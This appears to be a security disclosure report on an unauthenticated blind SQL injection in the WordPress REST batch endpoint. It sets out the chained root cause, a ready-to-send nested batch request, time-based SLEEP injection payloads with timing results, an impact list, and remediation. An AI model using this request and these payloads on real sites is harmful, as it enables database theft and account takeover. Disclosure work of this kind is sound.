## Vulnerability Details

## Summary

The WordPress REST API batch endpoint (`/wp-json/batch/v1`) on `████████` is vulnerable to an **unauthenticated blind SQL injection**. By nesting a crafted batch payload, an attacker triggers a route-dispatch desynchronisation that causes a user-controlled string to bypass parameter sanitisation and reach a raw SQL `NOT IN (...)` clause. No authentication, cookies, or tokens are required.

## Root Cause

Two flaws chain together:

1. **Batch dispatch index desync**  When a sub-request path fails `parse_url()`, the error result is not pushed into the internal `$matches` array, but the dispatch loop still increments its index. This causes sub-request *N* to execute with the handler registered for sub-request *N+1*.

2. **Missing type guard on `author__not_in`**  `WP_Query` checks `if (! empty($q['author__not_in']))` but does not verify it is an array. When a string value arrives (via the desynchronised route), it skips the per-element `absint()` cast and is concatenated directly into the SQL query:
   ```sql
   AND wp_posts.post_author NOT IN ( <attacker-controlled> )
   ```

By embedding a second batch layer inside a `POST /wp/v2/categories` body, the inner sub-requests are re-dispatched with shifted handlers, allowing a `GET /wp/v2/categories?author_exclude=<SQLI>` to execute as a posts query with raw injection.

## Proof of Concept

### Step 1 —Version fingerprint

```
GET /feed/ HTTP/1.1
Host: ████████
```

Response contains:
```xml
<generator>https://wordpress.org/?v=7.0</generator>
```

WordPress **7.0**  affected version.

### Step 2  Structural confirmation (non-destructive)

```http
POST /wp-json/batch/v1 HTTP/1.1
Host: ████████
Content-Type: application/json

{"validation":"normal","requests":[
  {"path":":","method":"POST"},
  {"path":"/wp/v2/categories","method":"POST","body":{
    "name":"x","requests":[
      {"path":":","method":"GET"},
      {"path":"/wp/v2/categories?author_exclude=1","method":"GET"},
      {"path":"/wp/v2/posts","method":"GET"}
    ]}},
  {"path":"/batch/v1","method":"POST"}
]}
```

**Response (HTTP 207):**

```
[0] status=400  code=parse_path_failed         ← invalid path ":" triggers desync
[1] status=207  → NESTED BATCH ENVELOPE        ← route confusion confirmed
    [0] status=400  code=parse_path_failed
    [1] status=200  → 10 posts returned         ← author__not_in=1 reached the DB
    [2] status=500  code=rest_invalid_handler
[2] status=400  code=rest_batch_not_allowed
```

The **nested** `"responses"` array (batch-inside-batch) with `parse_path_failed` markers proves the dispatch desynchronisation executed. A patched server returns a flat envelope with `rest_cannot_create`.

### Step 3  Time-based SQL injection confirmation

Injection point: `author_exclude=1) OR SLEEP(N)-- -`

Same request as Step 2, replacing `author_exclude=1` with the payloads below:

| Payload | Response Time | HTTP | Notes |
|---|---|---|---|
| `1` (baseline) | **0.46 s** | 207 | No SQL function |
| `1) OR SLEEP(0)-- -` | **0.49 s** | 207 | SQL parsed, zero delay |
| `1) OR SLEEP(0)-- -` (repeat) | **0.54 s** | 207 | Consistent baseline |
| `1) OR SLEEP(0.01)-- -` | **9.12 s** | 207 | ~860 rows × 0.01s |
| `1) OR SLEEP(0.3)-- -` | **>30 s** | timeout | ~860 rows × 0.3s |
| `1) OR SLEEP(3)-- -` | **>60 s** | timeout | ~860 rows × 3s |

The differential between `SLEEP(0)` (**0.5s**) and `SLEEP(0.01)` (**9.1s**)  identical SQL structure, only the delay constant differs  proves the injected function executes on the MySQL backend. The per-row multiplication (~860 matching posts) confirms injection inside a `WP_Query` result-set evaluation.

## Testing Discipline

All testing was non-destructive: structural detection with a benign value (`1`), timing oracle (`SLEEP`), and version fingerprinting from public metadata. **No database content was extracted. No user data or PII was accessed.**

## Impact

An unauthenticated attacker can read any data accessible to the WordPress database account:

- **`wp_users`**  password hashes → offline cracking → admin account takeover
- **`wp_usermeta`**  session tokens, application passwords → direct session hijack
- **`wp_options`**  API keys, plugin secrets, site configuration
- On deployments where the MySQL account holds `FILE` privilege with webroot access, this escalates to **remote code execution** via `SELECT ... INTO OUTFILE`

## Remediation

1. **Update WordPress** to the latest patched release (7.0.2+ / 6.9.5+ / 6.8.6+).
2. Interim: block unauthenticated `POST` to `/wp-json/batch/v1` and `/?rest_route=/batch/v1` at the reverse proxy or WAF.
3. Audit and restrict the MySQL account's privileges  revoke `FILE` if granted.
